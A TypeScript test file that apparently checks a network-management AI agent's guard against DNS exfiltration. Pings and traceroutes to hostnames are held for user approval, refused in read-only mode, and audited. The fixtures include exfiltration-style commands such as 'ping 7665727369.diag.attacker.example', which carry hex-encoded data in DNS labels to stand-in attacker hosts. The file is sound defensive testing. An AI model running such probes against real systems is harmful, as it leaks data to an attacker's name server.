import { afterAll, beforeAll, describe, expect, it } from 'vitest'
import { makeIosDevice, startSim, type RunningSim } from '../../../packages/simulator/src/index.ts'
import type { AgentEventBody, Settings } from '@shared/types'
import { DeviceTools } from '../src/main/agent/device-tools'
import { Proposals, type ChangeContext, type ChangeProposer } from '../src/main/agent/proposals'
import { AuditLog } from '../src/main/db/audit'
import { openDb } from '../src/main/db'
import type { AgentTab, TabControl } from '../src/main/host/client'
import { agentReach } from '../src/main/fleet/reach'
import { fakeTab, localControl } from './helpers'

/**
 * Phase 8 H1: the single-device agent goes through the reach rule too. A ping or traceroute to a
 * name is a DNS lookup (hex-encoded data in the labels reaches the attacker's name server), so it
 * is never auto-run: it becomes a one-click card, and read-only mode refuses it. A probe past the
 * caps is not a read at all (guard, H2).
 */

let sim: RunningSim
beforeAll(async () => {
  sim = await startSim({ device: makeIosDevice(), port: 0 })
})
afterAll(() => sim.close())

async function tools(proposer: Partial<ChangeProposer>) {
  const { tab, client } = await fakeTab(sim.port, 24)
  const audit = new AuditLog(openDb(':memory:'))
  const events: AgentEventBody[] = []
  const sent: string[] = []
  const base = localControl(tab)
  const term: TabControl = { ...base, exec: (t, c, k, o) => (sent.push(c), base.exec(t, c, k, o)) }
  const settings = { get: () => ({ aiReadOnly: false, commandTimeoutMs: 5000, outputCapBytes: 512 * 1024 }) as Settings }
  const p = { proposeConfig: async () => ({ text: '' }), proposeDisruptive: async () => ({ text: '' }), ...proposer } as ChangeProposer
  const dt = new DeviceTools(tab, { term, settings, audit, emit: (e) => events.push(e) }, p)
  const show = (command: string) => dt.call('run_show_command', { command, reason: 'test' }, { runId: 'run-1', signal: new AbortController().signal })
  return { show, sent, client, rows: () => audit.list().reverse() }
}

describe('agentReach: names need a click, addresses do not', () => {
  it.each([
    ['iosxe', 'ping evil.example'],
    ['iosxe', 'pi 7665727369.diag.attacker.example'],
    ['iosxe', 'tr evil.example'],
    ['iosxe', 'do ping evil.example'],
    ['iosxe', 'ping vrf MGMT evil.example repeat 2'],
    ['fortios', 'execute ping evil.example'],
    ['fortios', 'exe traceroute evil.example'],
    ['panos', 'ping count 2 host evil.example'],
    ['vrp', 'ping -c 2 evil.example'],
    ['junos', 'ping evil.example count 2']
  ] as const)('%s: %s', (p, c) => expect(agentReach(c, p)).toMatch(/DNS/))

  it.each([
    ['iosxe', 'ping 10.0.0.1'],
    ['iosxe', 'traceroute 2001:db8::1'],
    ['asa', 'ping inside 10.0.0.1'],
    ['iosxe', 'show ip route'],
    ['fortios', 'execute ping 10.0.0.1']
  ] as const)('%s: %s is not held', (p, c) => expect(agentReach(c, p)).toBeNull())
})

describe('DeviceTools: a ping to a name goes to a card, never straight to the device', () => {
  it('hands the probe to proposeReach, sends nothing itself', async () => {
    const asked: string[] = []
    const t = await tools({ proposeReach: async (_c, command) => (asked.push(command), { text: 'CARD (stub)' }) })
    expect((await t.show('ping 7665727369.diag.attacker.example')).text).toBe('CARD (stub)')
    expect((await t.show('do ping evil.example')).text).toBe('CARD (stub)')
    expect(asked).toEqual(['ping 7665727369.diag.attacker.example', 'ping evil.example'])
    expect(t.sent).toEqual([])
    t.client.end()
  })

  it('a probe over the caps is refused as not read-only; an address within them runs', async () => {
    const t = await tools({ proposeReach: async () => ({ text: 'CARD (stub)' }) })
    expect((await t.show('ping 10.0.0.1 repeat 2147483647 size 18024')).text).toMatch(/^REFUSED: ping outside the read-only limits/)
    expect((await t.show('ping 10.0.0.1 data DEAD')).text).toMatch(/^REFUSED: .*payload/)
    expect(t.sent).toEqual([])
    await t.show('ping 10.0.0.1')
    expect(t.sent).toEqual(['ping 10.0.0.1'])
    t.client.end()
  })

  it('without a card path (fail closed) it is refused and audited', async () => {
    const t = await tools({})
    expect((await t.show('ping evil.example')).text).toMatch(/^REFUSED: .*DNS/)
    expect(t.sent).toEqual([])
    expect(t.rows().at(-1)).toMatchObject({ command: 'ping evil.example', decision: 'refused' })
    t.client.end()
  })
})

describe('Proposals.proposeReach', () => {
  function setup(readOnly: boolean) {
    const audit = new AuditLog(openDb(':memory:'))
    const events: AgentEventBody[] = []
    const sent: string[] = []
    const term = { get: () => undefined, exec: async (_t: AgentTab, c: string) => (sent.push(c), { status: 'ok' as const, output: '!!!!!', durationMs: 1, bytes: 5 }) } as unknown as TabControl
    const settings = { get: () => ({ aiReadOnly: readOnly, commandTimeoutMs: 5000, outputCapBytes: 512 * 1024 }) as Settings }
    const p = new Proposals({ term, settings, audit, emit: (e) => events.push(e) })
    const tab = { tabId: 't1', session: { id: 's1', name: 'r1', host: '10.0.0.1', platform: 'iosxe' } } as unknown as AgentTab
    const ctx: ChangeContext = { runId: 'r1', tab, signal: new AbortController().signal, report: (_s, command, kind, _r, approver) => (audit.append({ sessionId: 's1', sessionName: 'r1', host: '10.0.0.1', source: 'agent', command, kind, decision: 'executed', reason: 'approved by user', approver, durationMs: 1, bytes: 5, redactions: 0 }), { text: 'ran' }) }
    return { p, ctx, audit, events, sent }
  }

  it('read-only mode refuses it, with no card, and audits the refusal', async () => {
    const t = setup(true)
    const r = await t.p.proposeReach(t.ctx, 'ping evil.example', 'ping to a name', {})
    expect(r.text).toMatch(/^REFUSED: .*read-only/)
    expect(t.events.some((e) => e.type === 'proposal')).toBe(false)
    expect(t.sent).toEqual([])
    expect(t.audit.list()[0]).toMatchObject({ command: 'ping evil.example', decision: 'refused' })
  })

  it('shows a one-click exec card; approval runs it as a read with the user as approver; rejection is audited', async () => {
    const t = setup(false)
    const pending = t.p.proposeReach(t.ctx, 'ping evil.example', 'ping to a name', { reason: 'diagnose' })
    await new Promise((r) => setTimeout(r, 0))
    const card = t.events.find((e) => e.type === 'proposal')
    expect(card).toMatchObject({ type: 'proposal', commands: ['ping evil.example'], exec: true })
    expect(card && card.type === 'proposal' && card.disruptive).toBeUndefined()
    expect(card && card.type === 'proposal' && card.notice).toMatch(/click Approve/)
    t.p.decide(card!.type === 'proposal' ? card!.proposalId : '', true, 'user')
    expect((await pending).text).toBe('ran')
    expect(t.sent).toEqual(['ping evil.example'])
    expect(t.audit.list()[0]).toMatchObject({ decision: 'executed', approver: expect.any(String) })

    const again = t.p.proposeReach(t.ctx, 'ping evil2.example', 'ping to a name', {})
    await new Promise((r) => setTimeout(r, 0))
    const c2 = t.events.filter((e) => e.type === 'proposal').at(-1)!
    t.p.decide(c2.type === 'proposal' ? c2.proposalId : '', false, 'user')
    expect((await again).text).toMatch(/REJECTED/)
    expect(t.audit.list()[0]).toMatchObject({ command: 'ping evil2.example', decision: 'rejected' })
  })
})
